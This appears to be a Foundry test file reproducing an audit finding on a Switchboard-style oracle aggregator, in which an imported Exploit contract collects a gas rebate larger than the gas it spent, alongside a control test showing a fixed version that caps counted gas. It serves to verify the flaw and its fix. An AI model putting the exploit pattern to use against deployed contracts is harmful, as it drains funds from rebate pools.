// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {
    AggregatorFixed,
    Exploit
} from "./47983-unbounded-gas-rebate-ottersec-none-switchboard-evm-pdf.sol";

contract CapCaller {
    function go(AggregatorFixed fixedAgg) external payable {
        (bool ok,) = address(fixedAgg).call{value: msg.value}("");
        require(ok, "fund");
        fixedAgg.saveResult(address(fixedAgg), address(0xBEEF), int256(2000 ether));
    }

    receive() external payable {}
}

contract Finding47983Test is Test {
    function test_exploit_rebate_exceeds_gas_spent() public {
        Exploit e = new Exploit();
        e.run{value: 1 ether}();

        assertGt(e.rebateWei(), e.gasSpentWei(), "rebate > gas spent");
        assertEq(e.rebateWei(), 1 + e.gasUsed() * 100 gwei, "100 gwei times uncapped gas");
        assertEq(e.gasSpentWei(), e.gasUsed() * 1 gwei, "1 gwei times the same gas");
        assertEq(address(e).balance, e.rebateWei(), "caller balance");
        assertEq(address(e.agg()).balance, 1 ether - e.rebateWei(), "pot remainder");
        assertGt(e.gasUsed(), 20_000, "above the control cap");
        console2.log("gasUsed", e.gasUsed());
        console2.log("rebateWei", e.rebateWei());
        console2.log("gasSpentWei", e.gasSpentWei());
    }

    function test_control_caps_counted_gas() public {
        AggregatorFixed fixedAgg = new AggregatorFixed();
        CapCaller caller = new CapCaller();
        vm.deal(address(caller), 1 ether);
        caller.go{value: 1 ether}(fixedAgg);

        assertGt(fixedAgg.gasUsed(), fixedAgg.MAX_REBATE_GAS(), "real gas above the cap");
        assertEq(fixedAgg.countedGas(), fixedAgg.MAX_REBATE_GAS(), "capped");
        assertEq(fixedAgg.rebatePaid(), 1 + uint256(fixedAgg.MAX_REBATE_GAS()) * 100 gwei, "capped rebate");
        assertLt(fixedAgg.rebatePaid(), 1 + fixedAgg.gasUsed() * 100 gwei, "cap pays less");
        console2.log("cappedRebate", fixedAgg.rebatePaid());
        console2.log("uncappedWouldBe", 1 + fixedAgg.gasUsed() * 100 gwei);
    }
}
